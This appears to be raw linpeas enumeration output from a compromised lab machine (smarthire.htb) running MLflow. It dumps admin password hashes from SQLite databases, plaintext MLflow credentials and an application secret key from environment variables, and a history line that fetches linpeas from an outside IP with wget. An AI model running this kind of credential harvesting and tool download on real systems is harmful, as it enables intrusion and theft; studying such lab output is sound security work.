-rw-r--r-- 1 root root 61 May 13 12:37 /var/lib/systemd/deb-systemd-helper-enabled/dpkg-db-[1;31mbackup[0m.timer.dsh-also
-rw-r--r-- 1 root root 2445 May  5 10:49 /etc/apt/sources.list[1;31m.bak[0m
-rw-r--r-- 1 root root 1759 Dec 15  2025 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_[1;31mbackup[0m.py
-rw-r--r-- 1 root root 1420 May 13 12:47 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_[1;31mbackup[0m.cpython-310.pyc
-rw-r--r-- 1 root root 10849 Apr 11 22:12 /usr/lib/modules/5.15.0-177-generic/kernel/drivers/power/supply/wm831x_[1;31mbackup[0m.ko
-rw-r--r-- 1 root root 13113 Apr 11 22:12 /usr/lib/modules/5.15.0-177-generic/kernel/drivers/net/team/team_mode_active[1;31mbackup[0m.ko
-rw-r--r-- 1 root root 138 Dec  5  2021 /usr/lib/systemd/system/dpkg-db-[1;31mbackup[0m.timer
-rw-r--r-- 1 root root 147 Dec  5  2021 /usr/lib/systemd/system/dpkg-db-[1;31mbackup[0m.service
-rw-r--r-- 1 root root 44008 Sep 23  2025 /usr/lib/x86_64-linux-gnu/open-vm-tools/plugins/vmsvc/libvm[1;31mbackup[0m.so
-rwxr-xr-x 1 root root 2196 Sep  9  2025 /usr/libexec/dpkg/dpkg-db-[1;31mbackup[0m
-rwxr-xr-x 1 root root 1086 Oct 31  2021 /usr/src/linux-headers-5.15.0-177/tools/testing/selftests/net/tcp_fastopen_[1;31mbackup[0m_key.sh
-rw-r--r-- 1 root root 11849 May 13 12:41 /usr/share/info/dir[1;31m.old[0m
-rw-r--r-- 1 root root 2747 Nov 27  2024 /usr/share/man/man8/vgcfg[1;31mbackup[0m.8.gz
-rw-r--r-- 1 root root 1536 Feb 20 09:26 /opt/tools/mlflow_ctl/plugins/core/__pycache__/[1;31mbackup[0m_models.cpython-310.pyc
-rw-r--r-- 1 root root 1474 Feb 19 16:49 /opt/tools/mlflow_ctl/plugins/core/[1;31mbackup[0m_models.py
-rwxr--r-- 1 root root 1177 Sep 19  2025 /opt/tools/[1;31mbackup[0m_models.py

[1;34m╔══════════╣ [1;32mSearching tables inside readable .db/.sql/.sqlite files (limit 100) [1;90m(T1005)
[0mFound /opt/mlflow/app/basic_auth[1;31m.db[0m: SQLite 3.x database, last written using SQLite version 3046001, file counter 22, database pages 9, cookie 0x4, schema 4, UTF-8, version-valid-for 22
Found /var/lib/command-not-found/commands[1;31m.db[0m: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 897, cookie 0x4, schema 4, UTF-8, version-valid-for 5
Found /var/lib/fwupd/pending[1;31m.db[0m: SQLite 3.x database, last written using SQLite version 3037002, file counter 3, database pages 6, cookie 0x5, schema 4, UTF-8, version-valid-for 3
Found /var/lib/PackageKit/transactions[1;31m.db[0m: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 5
Found /var/www/smarthire.htb/smarthire[1;31m.db[0m: SQLite 3.x database, last written using SQLite version 3037002, file counter 6, database pages 4, cookie 0x1, schema 4, UTF-8, version-valid-for 6

[1;32m -> Extracting tables from[0m /opt/mlflow/app/basic_auth.db [1;90m(limit 20)
[0m[1;34m  --> Found interesting column names in[0m [1;31musers [1;90m(output limit 10)[0m
[0mCREATE TABLE [1;31musers[0m (
	id INTEGER NOT NULL, 
	[1;31musername[0m VARCHAR(255), 
	[1;31mpassw[0mord_[1;31mhash[0m VARCHAR(255), 
	is_admin BOOLEAN, 
	PRIMARY KEY (id), 
	UNIQUE ([1;31musername[0m)
)
1, admin, scrypt:32768:8:1$VTZzihuLOfXxQv4x$979e567ec0829592e844f316e2c034b53b32939a6cc9c013d4da8734ca5115b52b2ce76bb3a56fd739fdb430e6d763ed3009ac19e438f86216fc97754d178196, 1

[1;32m -> Extracting tables from[0m /var/lib/command-not-found/commands.db [1;90m(limit 20)
[0m[1;32m -> Extracting tables from[0m /var/lib/fwupd/pending.db [1;90m(limit 20)
[0m[1;32m -> Extracting tables from[0m /var/lib/PackageKit/transactions.db [1;90m(limit 20)
[0m[1;32m -> Extracting tables from[0m /var/www/smarthire.htb/smarthire.db [1;90m(limit 20)
[0m[1;34m  --> Found interesting column names in[0m [1;31musers [1;90m(output limit 10)[0m
[0mCREATE TABLE [1;31musers[0m (
                    id TEXT PRIMARY KEY,
                    [1;31musername[0m TEXT UNIQUE NOT NULL,
                    [1;31mpassw[0mord_[1;31mhash[0m TEXT NOT NULL,
                    company TEXT NOT NULL
                )
c60105fde399, admin, scrypt:32768:8:1$76OuZ6CZ1iICwCHq$071148ff603f6fb8084f7ad5b87b58cd0dd0e9f4c59fd806be1ae1f4a1b87a3824dd6810b78f07ce9c8b42f4371d07d06a061f6a6f9c4edd0c352c71df3834c6, smarthire


[1;34m╔══════════╣ [1;32mWeb files?(output limit) [1;90m(T1005)
[0m/var/www/:
total 16K
drwxr-xr-x  4 root   root   4.0K Feb 20 07:44 .
drwxr-xr-x 13 root   root   4.0K Sep 16  2025 ..
drwxr-xr-x  2 root   root   4.0K Sep 16  2025 html
drwxr-xr-x  7 svcweb svcweb 4.0K Jul  2 02:46 smarthire.htb

/var/www/html:
total 12K
drwxr-xr-x 2 root root 4.0K Sep 16  2025 .

[1;34m╔══════════╣ [1;32mAll relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70) [1;90m(T1564.001)
[0m-rw-r--r-- 1 svcweb svcweb 220 Jan  6  2022 /home/svcweb/.bash_logout
-rw-r--r-- 1 landscape landscape 0 Sep 11  2024 /var/lib/landscape/.cleanup.user
-rw------- 1 root root 0 Sep 11  2024 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 Jan  6  2022 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 0 Jul  2 02:35 /run/ubuntu-fan/.lock
-rw-r--r-- 1 root root 0 Jul  2 02:35 /run/network/.ifstate.lock

[1;34m╔══════════╣ [1;32mReadable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70) [1;90m(T1552.001)
[0m-rwxr-xr-x 1 svcweb svcweb 1063041 Jun  4 23:23 /tmp/linpeas.sh
-rw-r--r-- 1 svcweb svcweb 56 Jul  2 03:18 /tmp/tmpn0_3ffyr/registered_model_meta
-rw-r--r-- 1 svcweb svcweb 464 Jul  2 03:18 /tmp/tmpn0_3ffyr/MLmodel
-rw-r--r-- 1 svcweb svcweb 153 Jul  2 03:18 /tmp/tmpn0_3ffyr/conda.yaml
-rw-r--r-- 1 svcweb svcweb 464 Jul  2 03:18 /tmp/tmpn0_3ffyr/metadata/MLmodel
-rw-r--r-- 1 svcweb svcweb 153 Jul  2 03:18 /tmp/tmpn0_3ffyr/metadata/conda.yaml
-rw-r--r-- 1 svcweb svcweb 47 Jul  2 03:18 /tmp/tmpn0_3ffyr/metadata/requirements.txt
-rw-r--r-- 1 svcweb svcweb 115 Jul  2 03:18 /tmp/tmpn0_3ffyr/metadata/python_env.yaml
-rw-r--r-- 1 svcweb svcweb 255 Jul  2 03:18 /tmp/tmpn0_3ffyr/python_model.pkl
-rw-r--r-- 1 svcweb svcweb 47 Jul  2 03:18 /tmp/tmpn0_3ffyr/requirements.txt
-rw-r--r-- 1 svcweb svcweb 115 Jul  2 03:18 /tmp/tmpn0_3ffyr/python_env.yaml
-rw-r--r-- 1 svcweb svcweb 56 Jul  2 03:28 /tmp/tmp7kh0t2c9/registered_model_meta
-rw-r--r-- 1 svcweb svcweb 464 Jul  2 03:28 /tmp/tmp7kh0t2c9/MLmodel
-rw-r--r-- 1 svcweb svcweb 153 Jul  2 03:28 /tmp/tmp7kh0t2c9/conda.yaml
-rw-r--r-- 1 svcweb svcweb 464 Jul  2 03:28 /tmp/tmp7kh0t2c9/metadata/MLmodel
-rw-r--r-- 1 svcweb svcweb 153 Jul  2 03:28 /tmp/tmp7kh0t2c9/metadata/conda.yaml
-rw-r--r-- 1 svcweb svcweb 47 Jul  2 03:28 /tmp/tmp7kh0t2c9/metadata/requirements.txt
-rw-r--r-- 1 svcweb svcweb 115 Jul  2 03:28 /tmp/tmp7kh0t2c9/metadata/python_env.yaml
-rw-r--r-- 1 svcweb svcweb 255 Jul  2 03:28 /tmp/tmp7kh0t2c9/python_model.pkl
-rw-r--r-- 1 svcweb svcweb 47 Jul  2 03:28 /tmp/tmp7kh0t2c9/requirements.txt
-rw-r--r-- 1 svcweb svcweb 115 Jul  2 03:28 /tmp/tmp7kh0t2c9/python_env.yaml
-rw-r--r-- 1 svcweb svcweb 1063041 Jun  4 23:23 /tmp/linpeas.sh.1
-rw-r--r-- 1 svcweb svcweb 331502 Jul  2 03:34 /tmp/output.txt

[1;34m╔══════════╣ [1;32mSearching passwords in history files [1;90m(T1552.001)
[0m/home/svcweb/.bash_history:wget http://10.10.16.121:8081/[1;31mlinpeas[0m.sh

[1;34m╔══════════╣ [1;32mSearching *password* or *credential* files in home (limit 70) [1;90m(T1552.001)
[0m/etc/pam.d/common-[1;31mpassword[0m
/usr/bin/systemd-ask-[1;31mpassword[0m
/usr/bin/systemd-tty-ask-[1;31mpassword[0m-agent
/usr/lib/git-core/git-[1;31mcredential[0m
/usr/lib/git-core/git-[1;31mcredential[0m-cache
/usr/lib/git-core/git-[1;31mcredential[0m-cache--daemon
/usr/lib/git-core/git-[1;31mcredential[0m-store
  #)[3mThere are more creds/passwds files in the previous parent folder[0m

/usr/lib/grub/i386-pc/[1;31mpassword[0m.mod
/usr/lib/grub/i386-pc/[1;31mpassword[0m_pbkdf2.mod
/usr/lib/python3/dist-packages/keyring/[1;31mcredential[0ms.py
/usr/lib/python3/dist-packages/keyring/__pycache__/[1;31mcredential[0ms.cpython-310.pyc
/usr/lib/python3/dist-packages/launchpadlib/[1;31mcredential[0ms.py
/usr/lib/python3/dist-packages/launchpadlib/__pycache__/[1;31mcredential[0ms.cpython-310.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/__pycache__/test_[1;31mcredential[0m_store.cpython-310.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/test_[1;31mcredential[0m_store.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_[1;31mcredential[0ms.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_[1;31mcredential[0ms.cpython-310.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_[1;31mpassword[0m_credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_[1;31mpassword[0m_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/[1;31mcredential[0ms.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/[1;31mcredential[0ms.cpython-310.pyc
/usr/lib/systemd/systemd-reply-[1;31mpassword[0m
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-[1;31mpassword[0m-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-[1;31mpassword[0m-console.path
/usr/lib/systemd/system/systemd-ask-[1;31mpassword[0m-console.path
/usr/lib/systemd/system/systemd-ask-[1;31mpassword[0m-console.service
/usr/lib/systemd/system/systemd-ask-[1;31mpassword[0m-plymouth.path
/usr/lib/systemd/system/systemd-ask-[1;31mpassword[0m-plymouth.service
  #)[3mThere are more creds/passwds files in the previous parent folder[0m

/usr/share/doc/git/contrib/[1;31mcredential[0m
/usr/share/doc/git/contrib/[1;31mcredential[0m/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/[1;31mcredential[0m/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/[1;31mcredential[0m/netrc/git-credential-netrc.perl
/usr/share/doc/git/contrib/[1;31mcredential[0m/netrc/t-git-credential-netrc.sh
/usr/share/doc/git/contrib/[1;31mcredential[0m/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/[1;31mcredential[0m/wincred/git-credential-wincred.c
/usr/share/man/man1/git-[1;31mcredential[0m.1.gz
/usr/share/man/man1/git-[1;31mcredential[0m-cache.1.gz
/usr/share/man/man1/git-[1;31mcredential[0m-cache--daemon.1.gz
/usr/share/man/man1/git-[1;31mcredential[0m-store.1.gz
  #)[3mThere are more creds/passwds files in the previous parent folder[0m

/usr/share/man/man8/systemd-ask-[1;31mpassword[0m-console.path.8.gz
/usr/share/man/man8/systemd-ask-[1;31mpassword[0m-console.service.8.gz
/usr/share/man/man8/systemd-ask-[1;31mpassword[0m-wall.path.8.gz
/usr/share/man/man8/systemd-ask-[1;31mpassword[0m-wall.service.8.gz
  #)[3mThere are more creds/passwds files in the previous parent folder[0m

/usr/share/pam/common-[1;31mpassword[0m.md5sums
/var/cache/debconf/[1;31mpassword[0ms.dat
/var/lib/cloud/instances/iid-datasource-none/sem/config_set_[1;31mpassword[0ms
/var/lib/fwupd/pki/secret.key
/var/lib/pam/[1;31mpassword[0m
/var/www/smarthire.htb/.venv/lib/python3.10/site-packages/docker/[1;31mcredential[0ms
/var/www/smarthire.htb/.venv/lib/python3.10/site-packages/mlflow/utils/[1;31mcredential[0ms.py
/var/www/smarthire.htb/.venv/lib/python3.10/site-packages/mlflow/utils/__pycache__/[1;31mcredential[0ms.cpython-310.pyc

[1;34m╔══════════╣ [1;32mChecking for TTY (sudo/su) passwords in audit logs [1;90m(T1552.001)
[0m
[1;34m╔══════════╣ [1;32mChecking for TTY (sudo/su) passwords in audit logs [1;90m(T1083)
[0m
[1;34m╔══════════╣ [1;32mSearching passwords inside logs (limit 70) [1;90m(T1552.001)
[0m
[1;34m╔══════════╣ [1;32mChecking all env variables in /proc/*/environ removing duplicates and filtering out useless env vars [1;90m(T1552.007,T1082)
[0m_=
GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
HOME=/home/svcweb
HOSTNAME=969dc29aadab
LANG=C.UTF-8
LANG=en_US.UTF-8
LESSCLOSE=/usr/bin/lesspipe %s %s
LESSOPEN=| /usr/bin/lesspipe %s
_=./linpeas.sh
LOGNAME=svcweb
_MLFLOW_SERVER_ARTIFACT_DESTINATION=./mlartifacts
_MLFLOW_SERVER_ARTIFACT_ROOT=mlflow-artifacts:/
_MLFLOW_SERVER_FILE_STORE=file:///app/mlruns
_MLFLOW_SERVER_REGISTRY_STORE=file:///app/mlruns
_MLFLOW_SERVER_SERVE_ARTIFACTS=true
MLFLOW_TRACKING_[1;31mPASSW[0mORD=[1;31mpassw[0mord
MLFLOW_TRACKING_URI=http://127.0.0.1:5000
MLFLOW_TRACKING_USERNAME=admin
OLDPWD=/var/www/smarthire.htb
PWD=/tmp
PWD=/var/www/smarthire.htb
PYTHON_SHA256=8fb5f9fbc7609fa822cb31549884575db7fd9657cbffb89510b5d7975963a83a
PYTHON_VERSION=3.11.13
SERVER_SOFTWARE=gunicorn/22.0.0
SHELL=/bin/bash
SHLVL=0
SMARTHIRE_[1;31mSECRET[0m_KEY=b9c53f2f4459ee6ed15f7f85c0549861
USER=svcweb
_=/usr/bin/dd
_=/usr/bin/grep
_=/usr/bin/tee
_=/usr/bin/xxd


[1;34m                                ╔════════════════╗
════════════════════════════════╣ [1;32mAPI Keys Regex[1;34m ╠════════════════════════════════
[1;34m                                ╚════════════════╝[0m
Regexes to search for API keys aren't activated, use param '-r' 


